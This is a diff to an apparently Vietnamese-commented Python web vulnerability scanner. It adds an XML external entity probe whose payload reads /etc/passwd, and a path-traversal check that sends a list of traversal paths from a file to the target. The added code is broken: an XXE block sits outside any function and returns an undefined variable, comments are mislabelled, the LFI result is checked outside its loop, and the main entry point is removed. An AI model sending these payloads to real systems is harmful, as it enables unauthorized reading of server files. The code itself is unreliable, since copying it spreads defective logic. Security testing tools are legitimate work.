@@ -68,6 +68,28 @@ def check_sqli(url, response):
   
   return False
 
+# Các endpoints cần kiểm tra XEE
+  xee_endpoints = ["/api/xml", "/upload"]
+  
+  # Payload XEE
+  xee_payload = '''<?xml version="1.0" encoding="ISO-8859-1"?>  
+  <!DOCTYPE foo [ <!ENTITY xee SYSTEM "file:///etc/passwd" > ]>
+  <root>&xee;</root>'''
+
+  # Crawl website
+  urls = crawl(url)
+
+  for u in urls:    
+    # Code kiểm tra XSS
+    if u in xee_endpoints:
+       # Gửi payload XEE
+       response = requests.post(u, data=xee_payload)
+       
+       if "root:" in response.text:
+          results.append({'url': u, 'vuln': 'XML External Entity'})
+  
+  return results
+
 # Hàm kiểm tra XSS
 def check_xss(url, response):
   # Chèn Javascript alert vào URL
@@ -81,16 +103,22 @@ def check_xss(url, response):
   return False
   
 # Hàm kiểm tra LFI  
+
 def check_lfi(url):
-  # Thử truy cập đến file /etc/passwd
-  lfi_url = url + "../etc/passwd"
-  lfi_response = requests.get(lfi_url)
+
+  pwd_paths = []
+  
+  with open('pwd.txt') as f:
+    pwd_paths = f.read().splitlines()
+
+  for path in pwd_paths:
+ # Thử truy cập đến file /etc/passwd với các giá trị dẫn đến file/etc/pwd trong file pwd.txt
+    lfi_url = url + path
+    lfi_response = requests.get(lfi_url)
   
   # Nếu trả về nội dung file passwd là có LFI
   if "root:" in lfi_response.text and "nobody:" in lfi_response.text:
     return True
   
   return False
-    
-if __name__ == "__main__":
-   main()
+  
